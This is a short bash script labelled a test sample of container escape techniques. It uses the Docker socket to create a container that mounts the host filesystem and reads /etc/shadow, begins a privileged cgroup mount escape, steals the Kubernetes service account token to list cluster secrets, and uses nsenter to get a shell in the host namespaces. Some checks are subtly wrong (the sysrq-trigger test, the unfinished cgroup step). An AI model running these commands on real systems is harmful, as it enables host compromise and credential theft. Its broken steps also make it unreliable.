#!/bin/bash
# [TEST SAMPLE] Container Escape Techniques - FOR SECURITY TESTING ONLY

# Docker socket escape
if [ -S /var/run/docker.sock ]; then
    curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
    curl -s --unix-socket /var/run/docker.sock -X POST \
        -H "Content-Type: application/json" \
        -d '{"Image":"alpine","Cmd":["cat","/host/etc/shadow"],"Binds":["/:/host"]}' \
        http://localhost/containers/create
fi

# Privileged container escape via /proc
if [ -d /proc/sysrq-trigger ]; then
    echo "Container may be running in privileged mode"
    mount -t proc proc /proc
    mkdir -p /tmp/cgrp
    mount -t cgroup -o rdma cgroup /tmp/cgrp
fi

# Kubernetes service account token theft
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    curl -sk -H "Authorization: Bearer $TOKEN" \
        https://kubernetes.default.svc/api/v1/namespaces/default/secrets
fi

# Host PID namespace access
ls -la /proc/1/root/ 2>/dev/null
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
